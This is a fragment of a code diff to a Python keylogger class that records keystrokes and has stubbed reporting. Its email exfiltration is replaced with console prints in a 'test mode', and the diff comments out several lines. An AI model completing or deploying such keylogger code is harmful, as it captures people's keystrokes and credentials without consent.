@@ -4,9 +4,9 @@ import time
 
 class Keylogger:
     def __init__(self):
-        self.log = ""
-        self.email = "dummy@example.com"
-        self.password = "dummy"  # not used in test mode
+        self.log = "" # this will set the log at the beginning to be empty and it can be used everywhere
+        #self.email = "dummy@example.com"
+        #self.password = "dummy"  # not used in test mode
 
     def save_data(self, key):
         try:
@@ -16,14 +16,10 @@ class Keylogger:
             self.log += f"[{key}]"
 
     def report(self):
-        """
-        Normally would send email.
-        In test mode, just print the log length and first 50 chars.
-        """
-        print(f"[REPORT] Log length: {len(self.log)}")
+        #print(f"[REPORT] Log length: {len(self.log)}")
         print(f"[REPORT] Log preview: {self.log[:50]}")
         # Reset log after reporting
-        self.log = ""
+        #self.log = ""
 
     # Override send_mail to avoid SMTP
     def send_mail(self, email, password, message):
@@ -38,7 +34,7 @@ class Keylogger:
             def periodic_report():
                 while True:
                     time.sleep(10)
-                    self.report()
+                    #self.report()
 
             t = threading.Thread(target=periodic_report, daemon=True)
             t.start()
